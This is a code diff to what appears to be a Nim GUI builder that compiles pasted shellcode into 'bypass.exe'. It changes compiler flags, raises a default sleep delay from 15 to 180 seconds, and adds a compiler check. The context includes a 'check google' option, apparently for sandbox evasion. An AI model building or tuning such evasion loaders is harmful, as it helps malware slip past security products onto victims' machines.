@@ -87,7 +87,10 @@ echo "test shellcode decode ok!"
   echo "test shellcode decode..."
   discard execShellCmd("nim c -r bytes_test.nim")
   echo "building bypass.exe:"
-  discard execShellCmd("nim c -d:mingw --cpu:amd64 -d:danger --app:gui bypass.nim")
+  if defined(windows):
+    discard execShellCmd("nim c -d:release -d:mingw --cpu:amd64 -d:danger --app:gui bypass.nim")
+  else:
+    discard execShellCmd("nim c -d:release -d:danger --app:gui bypass.nim")
   return true
 
 proc show_gui() =
@@ -96,7 +99,7 @@ proc show_gui() =
     container = newLayoutContainer(Layout_Vertical)
     gen_btn = newButton("生成")
     use_google_cb = newCheckbox("检测google")
-    sleep_text = newTextBox("15")
+    sleep_text = newTextBox("180")
     shell_text = newTextArea()
     head_check_line = newLayoutContainer(Layout_Horizontal)
     code_line = newLayoutContainer(Layout_Vertical)
@@ -115,6 +118,9 @@ proc show_gui() =
   gen_btn.widthMode = WidthMode_Fill
   container.add(gen_btn)
   gen_btn.onClick = proc(event: ClickEvent) =
+    if findExe("nim") == "":
+      alert(nil, "需要安装mingw与nim编译器", "错误")
+      return
     var
       sleep_s = 0
       shellcode = shell_text.text().strip()
